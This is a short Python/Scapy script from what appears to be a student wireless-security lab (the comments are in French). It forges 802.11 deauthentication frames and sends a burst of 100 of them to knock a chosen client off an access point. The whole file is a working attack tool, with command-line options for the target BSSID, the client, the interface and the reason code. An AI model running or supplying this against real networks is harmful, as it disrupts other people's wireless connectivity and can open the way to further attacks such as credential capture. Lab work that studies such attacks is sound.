# Description : Script permettant de deauthentifier une station connecté près d'un AP
# Authors     : Géraud SILVESTI, Alexandre JAQUIER, Francesco MONTI
# Date        : 28.03.2023
# Usage       : 1_deauth.py -a <BSSID> -c <Client> -i <INTERFACE> -r <REASON_CODE>
# Source      : https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py

from scapy.all import conf, sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import argparse

# Param nécessaire (à remplir) permettant de lancer l'attaque
parser = argparse.ArgumentParser(prog="Scapy deauth", description="Deauth script for SWI LAB")

parser.add_argument("-a", "--bssid", required=True)
parser.add_argument("-c", "--client", required=True)
parser.add_argument("-i", "--interface", required=True)
parser.add_argument("-r", "--code", required=True, choices=['1', '4', '5', '8'])
args = parser.parse_args()

toSta = [1,4,5]
if int(args.code) in toSta:
    dot11 = Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid)
if int(args.code) == 8:
    dot11 = Dot11(addr1=args.bssid, addr2=args.client, addr3=args.client)

# stack them up 
packet = RadioTap() / dot11 / Dot11Deauth(reason=int(args.code))
# send the packet
sendp(packet, inter=0.1, count=100, iface=args.interface, verbose=1)